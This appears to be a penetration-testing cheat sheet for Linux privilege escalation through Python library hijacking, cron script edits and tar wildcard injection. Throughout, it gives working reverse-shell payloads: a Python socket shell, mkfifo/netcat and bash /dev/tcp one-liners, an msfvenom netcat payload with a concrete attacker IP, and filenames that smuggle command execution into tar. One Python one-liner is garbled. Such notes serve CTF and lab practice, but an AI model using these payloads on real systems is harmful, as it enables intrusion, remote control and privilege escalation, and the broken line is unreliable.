## Python Library Hijack

- base64

````python
#!/usr/bin/python3  
from os import dup2  
from subprocess import run  
import socket  
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)  
s.connect(("LOCAL_IP",1234))   
dup2(s.fileno(),0)   
dup2(s.fileno(),1)   
dup2(s.fileno(),2)   
run(["/bin/bash","-i"])
````

---

- OS

```python
import os

def choice(a):

	os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ATTCK PORT>/tmp/f")
```

---

- Edit an script running in a crontab:

```bash
bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
```

---

- How to stabilise a shell:
````shell
python -c "import pty; pty.spawn('/bin/bash')" 
python3 -c "import pty; pty.spawn('/bin/bash')" 
````

---

- Python

```python
...#whatever it does before
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,s.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]));'

# other option
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f" > twasBrillig.sh
```

---

- If you see that running `sudo -l` someone is using a wildcard like:

![](./img/Pasted%20image%2020240210151540.png)

- Run the following:

```shell
msfvenom -p cmd/unix/reverse_netcat lhost=IP_ATTCK lport=PORT R
```

- Which gives us the exploit:

```shell
mkfifo /tmp/fmkltf; nc 10.14.69.1 1234 0</tmp/fmkltf | /bin/sh >/tmp/fmkltf 2>&1; rm /tmp/fmkltf
```

- Steps:
	1. Copy the reverse shell on the remote host
	2. Run the action when the checkpoint is reached: `echo "" > "--checkpoint-action=exec=sh shell.sh"`
	3. Show progress message every record: `echo "" > --checkpoint=1`
	4. Set up a listener on your local machine

---